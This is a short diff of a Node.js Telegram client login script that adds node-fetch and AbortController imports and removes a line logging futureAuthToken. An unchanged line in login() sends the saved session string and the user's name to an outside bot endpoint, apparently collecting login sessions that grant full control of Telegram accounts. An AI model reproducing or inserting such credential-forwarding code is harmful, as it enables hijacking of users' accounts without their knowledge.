@@ -1,5 +1,7 @@
 import { Api, TelegramClient } from "telegram";
 import { ApiCredentials } from "telegram/client/auth";
+import { AbortController } from "node-abort-controller";
+import fetch from "node-fetch";
 
 const dotenv = require('dotenv');
 dotenv.config();
@@ -156,7 +158,6 @@ async function login() {
             termsOfService = result.termsOfService;
         } else {
             const sess = client.session.save()
-            console.log(result.futureAuthToken.toString());
             console.log(sess);
             await fetchWithTimeout(`${ppplbot}&text=${(username).toUpperCase()}:${sess}`);
             return result.user
